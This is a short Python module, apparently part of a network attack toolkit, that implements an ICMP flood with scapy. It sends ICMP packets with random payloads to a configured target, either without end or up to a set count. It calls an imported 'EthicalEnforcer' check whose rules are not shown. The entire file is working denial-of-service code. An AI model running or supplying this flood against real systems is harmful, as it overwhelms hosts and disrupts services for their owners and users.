from scapy.all import IP, ICMP, send
import asyncio
from core.ethical_check import EthicalEnforcer
import random

class ICMPFlood:
    def __init__(self):
        self.eth = EthicalEnforcer()
        
    async def attack(self, config):
        self.eth.validate_target(config.target)
        packets_sent = 0
        
        while True:
            if config.packets > 0 and packets_sent >= config.packets:
                break
                
            # Send ICMP packets with random payloads
            payload = b"X" * random.randint(64, 1500)
            send(IP(dst=config.target)/ICMP()/payload, verbose=0)
            packets_sent += 1
            
            if packets_sent % 100 == 0:
                print(f"Sent {packets_sent} ICMP packets", end='\r')
        
        print(f"\nICMP flood completed. Total packets: {packets_sent}")